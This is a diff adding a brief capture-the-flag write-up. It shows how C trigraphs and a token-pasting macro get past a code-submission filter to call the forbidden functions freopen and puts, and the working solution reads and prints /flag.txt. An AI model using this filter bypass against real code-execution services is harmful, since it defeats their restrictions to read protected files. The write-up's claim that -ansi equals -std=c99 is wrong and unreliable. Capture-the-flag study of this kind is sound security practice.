@@ -1,0 +1,36 @@
+Use Trigraph to input # character.
+
+#define cc(a,b) a##b
+
+??= ---> #
+
+Using above macro make it possible to use forbidden function calls.
+
+freopen the flag file.
+scanf the flag value
+print the value!
+
+
+To utilize trigraphs features, compiler command line must specify trigraphs
+or standard-conforming mode is required.
+
+-ansi option is equivalent to -std=c99.
+
+gcc -o test test.c -trigraphs
+
+gcc -o test test.c -ansi
+gcc -o test test.c -std=c99
+
+```
+#include <stdio.h>
+int main() {
+    //Your code will be place here!
+    char buf[1024];
+    ??=define cc(a,b) a??=??=b
+    cc(freo,pen)("/flag.txt", "r", stdin);
+    scanf("%s", buf);
+    cc(pu,ts)(buf);
+    //Please enjoy problem solving!
+}
+
+```
